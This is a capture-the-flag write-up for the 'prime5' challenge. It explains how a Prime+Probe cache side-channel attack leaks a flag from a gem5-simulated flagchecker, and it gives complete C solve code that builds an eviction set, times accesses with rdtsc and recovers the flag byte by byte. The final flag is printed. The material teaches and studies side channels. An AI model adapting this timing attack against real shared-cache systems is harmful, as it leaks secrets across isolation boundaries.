# prime5 (misc, hard)

> My new simulated flagchecker service is free from any pesky channels outside of intended communication.

## Challenge
The challenge is about attacking a I/O service implemented on top of the gem5 simulator, which is a particularly accurate CPU simulator. Syscalls are disabled besides write(). You can provide an x86-64 binary and the simulator will run it. The simulation is configured with a unified cache and two memory blocks; one of which is used by the challenge flagchecker specifically and is not readable by the solver.

The I/O service implements a flagchecker which checks the flag bytes incrementally. It attempts to run in constant time by setting a response time as a constant offset from the start of the flag check. Additionally, it flushes all of its memory from the cache at the end to try to prevent cache attacks.

## Solution
The catch is that even if a cache line is flushed, it doesn't undo the fact that _which_ cache lines are touched depends on how much of the flag is checked, and just the accessing of memory through the cache can cause other cache lines to be evicted. This allows us to mount a cache attack usually known as *Prime+Probe*, where you *prime* the cache state so that the victim program modifies it in an observerable way, then *probe* the cache state after.

Caches are organized into sets, which are different isolated groups of cache entries that are indexed based on the memory address bits (physical address in this case). The size of the set is known as the associativity (8 in this challenge), and there are `CACHE_SIZE / CACHE_LINE_SIZE / ASSOCIATIVITY` different sets. Since this is running in a simulator, we know the physical addresses of all of our challenge code and memory, so we can easily allocate a buffer such that it has the correct cache set. We can mark 8 addresses that share the same cache set, which will completely fill it up. The cache's replacement policy is known as `TreePLRU`, which is a pseudo last recently used replacement policy, which basically means that if the cache set is full and a new cache line needs to replace an old one, the cache will try to always evict the cache line that was used the longest ago. The differences between LRU and TreePLRU aren't particularly important for this challenge; but TreePLRU was the most common replacement policy until recently (now often RRIP) in real-world desktop CPUs.

The 8 addresses we marked are known as an victim "eviction set" since accessing them evicts everything else in the cache set and fills it completely with these addresses. If we access our eviction set before the flagchecker runs, and the flagchecker accesses memory belonging to the same cache set, it will cause one of these addresses to be evicted. After running the flagchecker, we can measure the time it takes to access the element that might have been evicted to determine if the flagchecker accessed the specific cache line or not.

For this challenge, we first align the flagchecker before each guess so that if the new guessed character is correct, the flagchecker will advance 1 more byte and access a new cache line, causing our memory to be evicted. Then we can simply try each byte for each position.

Solution:

```c
#include <stdint.h>
#include <stddef.h>

#define EXIT asm volatile("mov rax, 60;syscall;");

const char hello[] = "Hello world!\n";
const char msg1[] = "guessed: ";
volatile char mem[0x1000000];

void write(char* s, uint64_t len) {
    asm volatile("mov rsi, %[s];mov rdx, %[len];mov rdi, 1;mov rax, 1;syscall;" : : [s]"r"(s), [len]"r"(len) : "rax", "rsi", "rdi", "rdx");
}

#define PAGE_SIZE 8192
#define PAGE_OFS 4096

char numOut[100] = {0};
char flag[32] = {0};
const size_t flag_len = 32;

#define MAX_UINT64_STR_LEN 21
// AI generated
int uint64_to_string(uint64_t value, char* str) {
    static char buffer[MAX_UINT64_STR_LEN];
    char* ptr = buffer + MAX_UINT64_STR_LEN - 1;  // Start at the end of the buffer

    *ptr = '\0'; // Null-terminate the string

    do {
        ptr--;
        *ptr = (value % 10) + '0'; // Convert the remainder to a character
        value /= 10;
    } while (value > 0);


    // Copy the string to the provided buffer if it's not NULL
    if(str != NULL) {
        char* src = ptr;
        while (*src != '\0') {
            *str++ = *src++;
        }
        *str = '\0'; // Null-terminate the destination string
    }


    return (buffer + MAX_UINT64_STR_LEN - 1) - ptr;  // Return the length of the string
}

void print_num(uint64_t num) {
    int s = uint64_to_string(num, numOut);
    write("-[out]: ", 8);
    write(numOut, s);
    write("\n", 1);
}

#define HIT_THRESHOLD = 100

void _start() {
    write(hello, sizeof(hello)-1);
    uint64_t t, t2;

    uint32_t count = 0;
    volatile char* victim = &mem[0];
    // align to page
    
    victim = (volatile char*)((uintptr_t)victim + PAGE_OFS);
    volatile char* victims[8] = {0};
    for(size_t i = 0; i < 8; i++) {
        victims[i] = (volatile char*)((uintptr_t)victim + PAGE_SIZE*i);
    }
    for(size_t i = 0; i < 8; i++) {
        *victims[i];
    }

    volatile char trash;
    for(size_t pos = 0; pos < flag_len-1; pos++) {
        // reset buffer to cl boundary at guess
        size_t target = (-1 - pos) % 0x1000;
        for(char guess = 0x20; guess <= '}'; guess++) {
            count %= 0x1000;
            for(; count != target; count++) {
                asm volatile("out 77, al;" : : "a"(1));
                count %= 0x1000;
            }
            if(pos > 0) {
                for(size_t known = 0; known < pos; known++) {
                    asm volatile("out 77, al;" : : "a"(flag[known]));   
                    count++;
                }
            }
            // guess
            asm volatile("out 77, al;" : : "a"(guess));
            count++;
            // remaining chars
            for(size_t known = pos+1; known < flag_len; known++) {
                asm volatile("out 77, al;" : : "a"(1));
                count++;
            }
            // to set up cache, evict the set
            for(size_t i = 0; i < 8; i++) trash = *victims[i];
            // trigger
            asm volatile("in al, 77;" : "=a"(trash) : "a"(trash));
            // time victim
            t = __builtin_ia32_rdtsc();
            trash = *victim;
            t2 = __builtin_ia32_rdtsc();
            print_num(t2-t);
            if((t2 - t) > 100) {
                write(msg1, sizeof(msg1)-1);
                print_num(guess);
                flag[pos] = guess;
                break;
            }
        }
    }
    flag[flag_len-1] = '}'; // known, no need to bother checking the response (p+p won't work here)

    write(flag, flag_len);
    write("\n", 1);
    EXIT
}
```

Flag: `irisctf{partitioned_cache_fails}`
